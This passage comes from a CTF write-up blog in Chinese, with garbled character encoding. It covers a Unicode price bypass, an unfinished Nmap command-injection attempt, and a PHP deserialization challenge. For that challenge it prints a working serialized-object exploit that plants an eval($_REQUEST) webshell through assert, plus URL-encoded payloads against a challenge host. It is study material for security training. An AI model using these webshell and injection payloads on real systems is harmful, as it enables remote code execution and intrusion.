class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-number">3.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;33&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;ğ„£&#x27;</span>)<br><span class="hljs-number">2000.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;ä¸‡&#x27;</span>)<br><span class="hljs-number">10000.0</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è¿™ä¸ªç½‘ç«™<code>https://www.compart.com/en/unicode</code>æ‰¾<code>numeric value</code>å¤§äº<code>1337</code>çš„å°±è¡Œ</p><p><img src="/img/unishop4.png" alt="unishop4"></p><p>ç›´æ¥æŠŠç›®æ ‡ç¬¦å·å¤åˆ¶ç²˜è´´åˆ°<code>Price</code>ä»·æ ¼é‡Œå°±å¥½äº†ã€‚</p><p>è¡¥å……ï¼šè¿™é¢˜æºç é‡Œæœ‰æ®µ<code>price = urlib.unquote(price).decode(&#39;utf-8&#39;)</code>ï¼Œå³å…ˆæŠŠè¾“å…¥<code>url</code>è§£ç åå†ç»è¿‡<code>utf-8</code>ç¼–ç èµ‹å€¼ç»™<code>price</code>ï¼Œç„¶åç”¨<code>unicodedata.numeric()</code>å¤„ç†<code>price</code>ã€‚</p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡å…ˆæ‰¾ç›®æ ‡å­—ç¬¦çš„<code>utf-8</code>ç¼–ç ï¼ŒæŠŠå®ƒè½¬æ¢æˆå¯¹åº”çš„<code>url</code>å½¢å¼(æŠŠ<code>0x</code>æ¢æˆ<code>%</code>å°±è¡Œï¼Œå†å»æ‰ç©ºæ ¼)</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap-è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap-è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap(è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾)"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap(è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾)</h2><p><img src="/img/nmap1.png" alt="nmap1"></p><p>ä¸€ä¸ªç«¯å£æ‰«æç½‘ç«™ï¼Œåˆæ­¥çŒœæµ‹å­˜åœ¨<code>RCE</code>æˆ–è€…æ–‡ä»¶åŒ…å«ã€‚</p><p>å…ˆçœ‹æºç é‡Œæœ‰å•¥ï¼š<code>&lt;!-- flag is in /flag --&gt;</code></p><p>å—¯ï¼Œé‚£åº”è¯¥æ˜¯è¦<code>RCE</code>äº†</p><p>éšä¾¿è¾“ä¸ª<code>127.0.0.1</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/namp2.png" alt="namp2"></p><p>æä¾›äº†ä¸€äº›ç«¯å£ä¿¡æ¯ï¼Œè¿™ä¸ª<code>URL</code>å€¼å¾—æ³¨æ„ï¼š</p><p><code>/result.php?f=f7909</code></p><p><code>to index</code>å°±æ˜¯è¿”å›é¦–é¡µï¼Œ<code>to list</code>æ˜¯è¿™ä¹ˆä¸ªç•Œé¢ï¼š</p><p><img src="/img/nmap3.png" alt="nmap3"></p><p><code>File</code>é‚£ä¸€æ å°±æ˜¯<code>result.php</code>åº•ä¸‹çš„<code>f</code>å‚æ•°ï¼Œå°è¯•äº†å…­æ¬¡å‘ç°æ–‡ä»¶ååº”è¯¥äº”å…­ä½åå…­è¿›åˆ¶çš„éšæœºæ•°ã€‚ä»–è¿™ä¸œè¥¿çš„è¿è¡Œè¿‡ç¨‹å¤§æ¦‚å°±æ˜¯æ‰«æç›®æ ‡<code>IP</code>çš„ç«¯å£ï¼Œç„¶åç»™ç»“æœäº”ä½åå…­è¿›åˆ¶éšæœºæ•°çš„æ–‡ä»¶åï¼Œå­˜å‚¨èµ·æ¥å¦‚æœæƒ³è¯»å–åˆ©ç”¨<code>result.php</code>è¿›è¡Œäº†æ–‡ä»¶åŒ…å«ã€‚</p><p>ä¸è¿‡ç»“æœä¸­å­˜åœ¨ä¸€ä¸ªè­¦å‘Šï¼ŒæŠ“åŒ…çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/nmap4.png" alt="nmap4"></p><p>é¦–å…ˆï¼Œè¾“å…¥<code>IP</code>åä¼šè¿›è¡Œ302é‡å®šå‘ã€‚</p><p>å¦‚æœéšä¾¿æ›´æ”¹<code>f</code>çš„å€¼å‘¢ï¼Ÿä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š</p><p><img src="/img/nmap5.png" alt="nmap5"></p><p>  <code>simplexml_load_file()</code>ä¼šæŠŠæŠŠXML æ–‡æ¡£è½½å…¥å¯¹è±¡ä¸­ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æŠŠç»“æœä»¥XMLæ–‡ä»¶çš„å½¢å¼å­˜å‚¨ã€‚</p><p><code>127.0.0.1;ls</code>æç¤º<code>Host maybe down</code>ï¼Œæ¢æˆ<code>127.0.0.1 ;</code>å‘ç°ä¼šç»™<code>;</code>å‰åŠ ä¸€ä¸ª<code>\</code>è¿›è¡Œè½¬ä¹‰å˜æˆ<code>127.0.0.1 \;</code>ï¼Œä½†å¦‚æœæ²¡æœ‰è¿™ä¸ªç©ºæ ¼ä¼šç›´æ¥æŠ¥é”™<code>host maybe down</code></p><p>åé¢æ£é¼“åŠå¤©ä¸çŸ¥é“æ€ä¹ˆå¼„äº†ï¼Œæ‰¾äº†<code>wp</code>å‘ç°æ˜¯è‡ªå·±æ€è·¯é”™äº†ï¼Œè¿™é¢˜è€ƒçš„æ˜¯<code>Nmap</code>çš„ä¸€äº›ç”¨æ³•ã€‚</p><p>è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾ã€‚ã€‚ä¸€çœ‹è¿™ä¸¤ä¸ª<code>escape</code>å‡½æ•°æˆ‘å°±å¤´ç–¼</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œå°è¯•å³é”®çœ‹æºç æ²¡å•¥ååº”ï¼Œç›´æ¥åœ¨URLåŠ <code>view-source:</code></p><p><img src="/img/real1.png" alt="real1"></p><p>å‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œç›´æ¥è®¿é—®ï¼š<code>./time.php?source</code>(æœ¬æ¥è¿˜æƒ³æ‹¿dirsearchæ‰«æ¥ç€ï¼Œçœ‹æ¥æ²¡å¿…è¦äº†)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//ç›¸å½“äºè°ƒç”¨äº†bè¿™ä¸ªå‡½æ•°è€Œä¸”å‚æ•°æ˜¯aï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ‰§è¡Œå‘½ä»¤</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))  <span class="hljs-comment">//è‹¥sourceè¢«èµ‹å€¼ï¼Œé«˜äº®æºç å¹¶die(0)ç»“æŸã€‚åé¢è¦ç»™dataèµ‹å€¼</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<span class="hljs-comment">//ååºåˆ—åŒ–GETä¼ çš„data</span><br><br><br><span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">04</span> <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">15</span><br><br><br><br></code></pre></td></tr></table></figure><p>ç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼Œç›´æ¥æ„é€ æˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;eval&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸è¿‡æ²¡æœ‰è¿è¡Œï¼Ÿåé¢æ¢äº†å…¶å®ƒçš„å‘½ä»¤ä¹Ÿæ˜¯æ²¡æœ‰å›æ˜¾ã€‚æ„Ÿè§‰æ˜¯è¢«è¿‡æ»¤äº†(å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤š)ï¼Œä½†ä¹Ÿæƒ³ä¸åˆ°å…¶å®ƒæ€è·¯ï¼Œå»çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„wpå‘ç°è¦ç”¨<code>assert</code>è¿™ä¸ªå‡½æ•°ï¼Œæ­£å¥½å€Ÿè¿™ä¸ªæœºä¼šæ¢³ç†ä¸€ä¸‹<code>RCE</code>ä¸­å¸¸ç”¨çš„å‡ ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œè¿˜æœ‰ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼š</p><p>æˆ‘ä¸ªäººè®¤ä¸ºæœ€å¸¸è§çš„è‚¯å®šæ˜¯<code>eval</code>å’Œ<code>system</code>ï¼Œå…ˆè¯´ä¸‹å®ƒä¿©ä¹‹é—´æœ€å¤§çš„å·®åˆ«(ä¸ªäººè§‚ç‚¹)ï¼š</p><p><strong>evalç±»å‹å‡½æ•°æ˜¯ä»£ç æ‰§è¡Œè€Œä¸æ˜¯å‘½ä»¤æ‰§è¡Œ</strong></p><p><strong>systemç±»å‹å‡½æ•°æ˜¯å‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ä»£ç æ‰§è¡Œ</strong>ï¼Œä¸¾å‡ ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);    <span class="hljs-comment">//2,æ³¨æ„æœ«å°¾çš„åˆ†å·</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);  <span class="hljs-comment">//1+1;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$num</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a = <span class="hljs-subst">$num</span>;&quot;</span>);   <span class="hljs-comment">//åªæœ‰è¿™ä¸ªå¹¶æ— ä»»ä½•å›æ˜¾ï¼Œå¯é€šè¿‡echoæˆ–var_dumpè·å¾—å›æ˜¾</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;\$b = <span class="hljs-subst">$num</span>;&quot;</span>);   <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//æ˜¾ç¤º1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//æ˜¾ç¤ºNULL</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);   <span class="hljs-comment">//phpinfo()è¢«æ‰§è¡Œ</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);  <span class="hljs-comment">//phpinfo()ä¸è¢«æ‰§è¡Œ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);    <span class="hljs-comment">//whoamiå‘½ä»¤è¢«æ‰§è¡Œ</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);      <span class="hljs-comment">//whoamiå‘½ä»¤ä¸è¢«æ‰§è¡Œ</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(whoami);&quot;</span>); <span class="hljs-comment">//æ‰§è¡ŒæˆåŠŸï¼Œæ³¨æ„å’Œä¸Šä¸€æ¡çš„åŒºåˆ«</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠsystemå’Œevalç»„åˆä½¿ç”¨</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<span class="hljs-comment">// &quot;system(&#x27;whoami&#x27;);&quot;; ä¹Ÿè¡Œï¼Œä½†æ³¨æ„åé¢çš„åˆ†å·ä¸€å®šä¸èƒ½ä¸¢æ‰</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//å›æ˜¾ viper3\rdj</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿™ä¸ª<code>echo $b($a)</code>ä¹Ÿæœ‰ç‚¹è¯´æ³•ï¼Œè¿™ä¸œè¥¿æœ‰äººå«å®ƒ<code>å˜é‡å‡½æ•°</code>ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;eval(&#x27;phpinfo();&#x27;)&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//å›æ˜¾phpinfoçš„å†…å®¹ï¼Œä½†æ˜¯ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;eval&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è¿™ä¸œè¥¿æ²¡æœ‰ä»»ä½•ç»“æœ</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//è¿™æ®µä»£ç ä¹Ÿèƒ½phpinfo</span><br></code></pre></td></tr></table></figure><p>å…ˆè¯´ä¸‹è¿™ä¸ª<code>assert</code>å‡½æ•°ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`assert()`å‡½æ•°æ¥å—ä¸€ä¸ªè¡¨è¾¾å¼ä½œä¸ºå‚æ•°ï¼Œå¹¶å¯¹è¯¥è¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼ã€‚å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸï¼Œåˆ™ç»§ç»­æ‰§è¡Œåç»­ä»£ç ï¼›å¦‚æœè¡¨è¾¾å¼ä¸ºå‡ï¼Œåˆ™è§¦å‘ä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚ä½†å®ƒä¹Ÿå¯ä»¥æ‰§è¡Œä»»æ„çš„PHPä»£ç ï¼ŒåŒ…æ‹¬æ‰§è¡Œå‘½ä»¤ã€‚è¿™æ˜¯å› ä¸º`assert()`å‡½æ•°åœ¨æ‰§è¡Œæ—¶ä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆä¸èƒ½åªå•çº¯ç”¨ä¸€ä¸ª<code>eval</code>ï¼ŒåŸå› æ˜¯PHPä¸­ä¸èƒ½ä»¥å˜é‡å‡½æ•°çš„å½¢å¼å»è°ƒç”¨å®ƒï¼ševal å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ å˜é‡å‡½æ•° çš„å½¢å¼æ¥è°ƒç”¨ã€‚</p><p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;eval($_REQUEST[3]);&#x27;</span>;<span class="hljs-comment">//REQUESTæ–¹æ³•ï¼Œä¼ å®Œäº†ç”¨GETã€POSTã€COOKIEéƒ½è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆç”¨<code>scandir</code>å‡½æ•°çœ‹çœ‹æ ¹ç›®å½•åº•ä¸‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p><code>time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=var_dump(scandir(&#39;/&#39;));</code></p><p>æ³¨æ„è¦ç”¨åˆ†å·ç»“å°¾ï¼å¦åˆ™ä¸èƒ½è¢«æ‰§è¡Œï¼ç”¨<code>var_dump</code>çš„åŸå› æ˜¯è¿™å‡½æ•°ä¼šè¿”å›æ•°ç»„</p><p><img src="/img/scandir2.png" alt="scandir2"></p><p>æœ‰ä¸ª<code>FIag_!S_it</code>ï¼Œ<code>system</code>è¢«ç¦äº†æ‰€ä»¥ç”¨ä¸äº†<code>cat</code>ï¼Œå°è¯•<code>file_get_contents</code>ç›´æ¥è¯»ï¼Œä½†æ˜¯å‡çš„<code>flag</code>ï¼š</p><p><code>echo(file_get_contents(&#39;/FIag_!S_it&#39;));</code></p><p>æ³¨æ„è¿™ä¸ª<strong>ä¸èƒ½</strong>å†™æˆï¼š</p><p><code>echo(&quot;file_get_contents(&#39;/FIag_!S_it&#39;)&quot;);</code>ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šæ˜¾ç¤º<code>file_get_contents(&#39;/FIag_!S_it&#39;)</code></p><p><img src="/img/scandir5.png" alt="scandir5"></p><p>ç”¨èšå‰‘è¿æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><code>http://1730f221-b91f-4b8b-b19d-8ce0eb0211e5.node4.buuoj.cn:81/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A&#123;s%3A1%3A%22a%22%3Bs%3A19%3A%22eval(%24_REQUEST[3])%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B&#125;</code></p><p><img src="/img/scandir4.png" alt="scandir4"></p><p><img src="/img/scandir3.png" alt="scandir3"></p><p>æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œåº”è¯¥æ˜¯æ²¡æƒé™ã€‚</p><p>çœ‹å¸ˆå‚…ä»¬çš„<code>wp</code>éƒ½æ˜¯å»<code>phpinfo()</code>æ‰¾ï¼Œ<code>ctrl+f</code>æœç´¢å°±è¡Œã€‚</p><p><code>payload:time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=phpinfo();</code></p><p>å†è¡¥å……ä¸‹<code>scandir()</code>è¿™ä¸ªå‡½æ•°ï¼š</p><p><code>scandir()</code>å‡½æ•°ä¼šæ¥å—ä¸€ä¸ªç›®å½•è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«è¯¥ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ã€‚è¿”å›çš„æ•°ç»„ä¸­ï¼Œæ¯ä¸ªå…ƒç´ è¡¨ç¤ºç›®å½•ä¸­çš„ä¸€ä¸ªæ–‡ä»¶æˆ–å­ç›®å½•çš„åç§°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;../WWW&#x27;</span>;<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/scandir1.png" 